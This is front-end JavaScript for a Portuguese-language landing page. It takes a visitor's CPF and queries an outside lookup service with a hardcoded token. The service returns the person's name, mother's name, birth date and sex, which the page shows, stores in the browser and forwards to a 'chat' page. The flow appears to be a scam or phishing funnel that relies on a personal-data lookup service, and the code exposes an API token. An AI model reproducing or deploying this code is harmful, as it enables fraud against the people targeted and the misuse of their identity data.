document.addEventListener("DOMContentLoaded", function () {
  // Elementos principais
  const mainPage = document.getElementById("mainPage");
  const cpfPage = document.getElementById("cpfPage");
  const btnAtivar = document.getElementById("btnAtivar");
  const btnVoltar = document.getElementById("btnVoltar");
  const btnAnalisar = document.getElementById("btnAnalisar");
  const btnSimular = document.getElementById("btnSimular");

  // Elementos de formulário
  const cpfInputPage = document.getElementById("cpfInputPage");
  const termsCheck = document.getElementById("termsCheck");

  // Elementos de resultado da consulta
  const consultaResultado = document.getElementById("consultaResultado");
  const loadingInfo = document.getElementById("loadingInfo");
  const userInfo = document.getElementById("userInfo");
  const errorInfo = document.getElementById("errorInfo");
  const errorMessage = document.getElementById("errorMessage");
  const btnConfirmar = document.getElementById("btnConfirmar");
  const btnCorrigir = document.getElementById("btnCorrigir");
  const btnTentarNovamente = document.getElementById("btnTentarNovamente");

  // Campos de informação do usuário
  const nomeUsuario = document.getElementById("nomeUsuario");
  const cpfUsuario = document.getElementById("cpfUsuario");
  const sexoUsuario = document.getElementById("sexoUsuario");
  const nomeMae = document.getElementById("nomeMae");
  // se existir na tela, a gente preenche; se não existir, só ignora
  const dataNascimento = document.getElementById("dataNascimento");

  // Obter parâmetros UTM
  function getUTMParams() {
    const urlParams = new URLSearchParams(window.location.search);
    const utmParams = {};

    [
      "utm_source",
      "utm_medium",
      "utm_campaign",
      "utm_content",
      "utm_term",
      "utm_id",
      "xcod",
    ].forEach((param) => {
      if (urlParams.has(param)) {
        utmParams[param] = urlParams.get(param);
      }
    });

    return utmParams;
  }

  // Formatação dos parâmetros UTM
  function formatUTMParams(params) {
    return Object.keys(params)
      .map(
        (key) => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`
      )
      .join("&");
  }

  // Formatar CPF enquanto digita
  function formatCPF(input) {
    let value = input.value.replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);

    if (value.length > 9) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    } else if (value.length > 6) {
      value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, "$1.$2.$3");
    } else if (value.length > 3) {
      value = value.replace(/^(\d{3})(\d{1,3})$/, "$1.$2");
    }

    input.value = value;
  }

  // Validar CPF
  function validateCPF(cpf) {
    cpf = cpf.replace(/\D/g, "");
    return cpf.length === 11;
  }

  // Formatação de data (YYYYMMDD para DD/MM/YYYY ou deixa como está se já estiver formatada)
  function formatDate(dateString) {
    if (!dateString) return "Não informado";

    // Verifica se a data já está no formato DD/MM/YYYY
    if (dateString.includes("/")) {
      return dateString;
    }

    // Converte do formato YYYYMMDD para DD/MM/YYYY
    if (dateString.length === 8) {
      return dateString.replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
    }

    return dateString;
  }

  

  // ==========================
  // CONSULTA CPF (NOVA API BK)
  // ==========================
  function consultarCPF(cpf) {
    const cpfLimpo = cpf.replace(/\D/g, "");

    // Mostrar resultados e estado de carregamento
    consultaResultado.classList.remove("hidden");
    loadingInfo.classList.remove("hidden");
    userInfo.classList.add("hidden");
    errorInfo.classList.add("hidden");

    // Rolar para baixo para mostrar o carregamento
    consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });

    // Executar a consulta
    fetch(
      `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpfLimpo}&token=574a7ff49027efebaa19dc18b17e4ead1dadf7eac42d65cb8acfa969a897e976`
    )
      .then((response) => {
        if (!response.ok) {
          throw new Error(`Erro na consulta: ${response.status}`);
        }
        return response.json();
      })
      .then((response) => {
        // Ocultar loading
        loadingInfo.classList.add("hidden");

        // Processar os dados da API
        // Formato esperado: { cpf, nome, mae, sexo, nascimento }
        let raw = response;
        let data = null;

        try {
          if (raw && (raw.cpf || raw.nome)) {
            // Normalizar para as chaves usadas no resto do código
            data = {
              CPF: raw.cpf || "",
              NOME: raw.nome || "",
              NOME_MAE: raw.mae || "",
              NASC: raw.nascimento || "",
              SEXO: raw.sexo || "",
            };
          }
        } catch (e) {
          console.error("Erro ao interpretar resposta da API:", e, raw);
        }

                if (data) {
          console.log("Dados normalizados:", data);

          // Preencher os campos com os dados do usuário
          nomeUsuario.textContent = data.NOME || "Não informado";

          if (dataNascimento) {
            dataNascimento.textContent =
              formatDate(data.NASC) || "Não informado";
          }

          cpfUsuario.textContent = data.CPF
            ? data.CPF.replace(
                /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
                "$1.$2.$3-$4"
              )
            : "Não informado";

          sexoUsuario.textContent = data.SEXO || "Não informado";
          nomeMae.textContent = data.NOME_MAE || "Não informado";

          // Salvar dados no objeto para usar depois
          const dadosUsuario = {
            nome: data.NOME || "",
            dataNascimento: data.NASC || "",
            nomeMae: data.NOME_MAE || "",
            cpf: data.CPF || "",
            sexo: data.SEXO || "",
          };

          // Salvar no localStorage para uso posterior
          localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));

          // Salvar nome e CPF separadamente para acesso fácil
          if (dadosUsuario.nome) {
            localStorage.setItem("nomeUsuario", dadosUsuario.nome);
          }
          if (dadosUsuario.cpf) {
            localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
          }



          // Mostrar informações do usuário
          userInfo.classList.remove("hidden");

          // Rolar para mostrar as informações
          setTimeout(() => {
            userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
          }, 100);
        } else {
          // Mostrar erro
          errorMessage.textContent =
            "Não foi possível obter os dados para este CPF.";
          errorInfo.classList.remove("hidden");

          // Rolar para mostrar o erro
          errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
        }
      })
      .catch((error) => {
        // Ocultar loading e mostrar erro
        loadingInfo.classList.add("hidden");
        errorMessage.textContent =
          error.message || "Ocorreu um erro ao consultar seus dados.";
        errorInfo.classList.remove("hidden");
        console.error("Erro na consulta:", error);

        // Rolar para mostrar o erro
        errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
      });
  }

  // Verificar se existe CPF na URL e salvar no localStorage
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has("cpf")) {
    const cpfFromUrl = urlParams.get("cpf").replace(/\D/g, "");
    if (validateCPF(cpfFromUrl)) {
      localStorage.setItem("cpf", cpfFromUrl);
      console.log("CPF da URL salvo no localStorage:", cpfFromUrl);
    }
  }

  // Mostrar página de CPF
  function showCPFPage() {
    mainPage.classList.add("fade-out");

    setTimeout(() => {
      mainPage.classList.add("hidden");
      cpfPage.classList.remove("hidden");

      void cpfPage.offsetWidth;

      cpfPage.classList.add("fade-in");
      cpfPage.classList.remove("opacity-0");

      cpfInputPage.focus();
    }, 400);
  }

  // Voltar para a página principal
  function showMainPage() {
    cpfPage.classList.remove("fade-in");
    cpfPage.classList.add("opacity-0");

    setTimeout(() => {
      cpfPage.classList.add("hidden");
      mainPage.classList.remove("hidden");

      void mainPage.offsetWidth;

      mainPage.classList.remove("fade-out");
    }, 400);
  }

  // Processar o formulário de CPF
  function processForm() {
    const cpf = cpfInputPage.value.replace(/\D/g, "");

    if (!validateCPF(cpf)) {
      alert("Por favor, digite um CPF válido (11 dígitos).");
      return;
    }

    if (!termsCheck.checked) {
      alert(
        "Você precisa concordar com os Termos de Uso e Política de Privacidade para continuar."
      );
      return;
    }

    // Salvar o CPF no localStorage para uso posterior
    localStorage.setItem("cpf", cpf);
    console.log("CPF salvo no localStorage:", cpf);

    // Consultar CPF na API em vez de redirecionar imediatamente
    consultarCPF(cpf);
  }

  // Redirecionar para o chat após confirmar os dados
  function redirecionarParaChat() {
    const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
    if (!dadosUsuarioJSON) {
      alert("Dados do usuário não encontrados. Por favor, tente novamente.");
      return;
    }

    try {
      const dadosUsuario = JSON.parse(dadosUsuarioJSON);
      if (!dadosUsuario.cpf) {
        alert("CPF não encontrado. Por favor, tente novamente.");
        return;
      }

      const cpf = dadosUsuario.cpf.replace(/\D/g, "");

      const urlAtual = new URLSearchParams(window.location.search);
      const novaUrl = new URLSearchParams();

      for (const [chave, valor] of urlAtual.entries()) {
        novaUrl.append(chave, valor);
      }

      novaUrl.set("cpf", cpf);

      window.location.href = `./chat/index.html?${novaUrl.toString()}`;
    } catch (error) {
      console.error("Erro ao processar dados para redirecionamento:", error);
      alert(
        "Ocorreu um erro ao processar seus dados. Por favor, tente novamente."
      );
    }
  }

  // Limpar informações e voltar para digitar CPF
  function corrigirDados() {
    consultaResultado.classList.add("hidden");
    cpfInputPage.focus();
  }

  // Tentar novamente após erro
  function tentarNovamente() {
    consultaResultado.classList.add("hidden");
    cpfInputPage.focus();
  }

  // Event Listeners
  if (btnAtivar) btnAtivar.addEventListener("click", showCPFPage);
  if (btnSimular) btnSimular.addEventListener("click", showCPFPage);
  if (btnVoltar) btnVoltar.addEventListener("click", showMainPage);

  if (btnAnalisar) {
    btnAnalisar.addEventListener("click", function () {
      console.log("Botão Analisar clicado");
      console.log("Valor do CPF antes do processamento:", cpfInputPage.value);
      processForm();
    });
  }

  // Listeners para os botões de confirmação/correção
  if (btnConfirmar) {
    btnConfirmar.addEventListener("click", redirecionarParaChat);
  }

  if (btnCorrigir) {
    btnCorrigir.addEventListener("click", corrigirDados);
  }

  if (btnTentarNovamente) {
    btnTentarNovamente.addEventListener("click", tentarNovamente);
  }

  // Formatação de CPF enquanto digita
  if (cpfInputPage) {
    cpfInputPage.addEventListener("input", function () {
      formatCPF(this);
      console.log("CPF formatado durante digitação:", this.value);
    });
  }

  // ======================
  // Carrossel (igual antes)
  // ======================
  const carousel = document.getElementById("carousel");
  const slides = document.querySelectorAll(".carousel-item");
  const indicators = document.querySelectorAll(".carousel-indicator");
  const prevBtn = document.getElementById("prev-btn");
  const nextBtn = document.getElementById("next-btn");

  const stepNumbers = document.querySelectorAll(".step-number");
  const stepLines = document.querySelectorAll(".step-line");

  let currentSlide = 0;
  let autoSlideInterval;

  function showSlide(index) {
    if (index < 0) {
      index = slides.length - 1;
    } else if (index >= slides.length) {
      index = 0;
    }

    slides.forEach((slide) => {
      slide.classList.remove("active");
    });

    slides[index].classList.add("active");

    indicators.forEach((indicator, i) => {
      if (i === index) {
        indicator.classList.add("active");
      } else {
        indicator.classList.remove("active");
      }
    });

    updateSteps(index);
    currentSlide = index;
  }

  function updateSteps(index) {
    stepNumbers.forEach((step, i) => {
      step.classList.remove("active", "completed");

      if (i === index) {
        step.classList.add("active");
      } else if (i < index) {
        step.classList.add("completed");
      }
    });

    stepLines.forEach((line, i) => {
      if (i < index) {
        line.classList.add("active");
      } else {
        line.classList.remove("active");
      }
    });
  }

  function nextSlide() {
    showSlide(currentSlide + 1);
    resetAutoSlide();
  }

  function prevSlide() {
    showSlide(currentSlide - 1);
    resetAutoSlide();
  }

  function startAutoSlide() {
    autoSlideInterval = setInterval(nextSlide, 5000);
  }

  function resetAutoSlide() {
    clearInterval(autoSlideInterval);
    startAutoSlide();
  }

  if (prevBtn && nextBtn && carousel) {
    nextBtn.addEventListener("click", nextSlide);
    prevBtn.addEventListener("click", prevSlide);

    indicators.forEach((indicator, index) => {
      indicator.addEventListener("click", () => {
        showSlide(index);
        resetAutoSlide();
      });
    });

    stepNumbers.forEach((step) => {
      step.addEventListener("click", () => {
        const stepIndex = parseInt(step.getAttribute("data-step"));
        showSlide(stepIndex);
        resetAutoSlide();
      });
    });

    let touchStartX = 0;

    carousel.addEventListener(
      "touchstart",
      (e) => {
        touchStartX = e.changedTouches[0].screenX;
      },
      { passive: true }
    );

    carousel.addEventListener(
      "touchend",
      (e) => {
        const touchEndX = e.changedTouches[0].screenX;
        const diff = touchEndX - touchStartX;

        if (diff > 50) {
          prevSlide();
        } else if (diff < -50) {
          nextSlide();
        }
      },
      { passive: true }
    );

    carousel.addEventListener("mouseenter", () => {
      clearInterval(autoSlideInterval);
    });

    carousel.addEventListener("mouseleave", () => {
      startAutoSlide();
    });

    showSlide(0);
    startAutoSlide();
  }
});
